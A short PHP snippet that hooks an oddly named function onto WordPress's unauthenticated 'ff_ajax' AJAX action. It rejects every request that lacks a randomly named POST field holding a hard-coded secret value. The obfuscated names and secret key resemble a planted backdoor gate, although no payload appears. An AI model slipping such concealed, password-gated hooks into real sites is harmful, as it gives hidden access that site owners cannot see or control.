<?php

function delete_modules_poster_schedule() {
	if (!isset($_POST["jflydifcnhi"]) || $_POST["jflydifcnhi"] !== "fH0Aa5PPlEvj") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'delete_modules_poster_schedule', 5, 1);
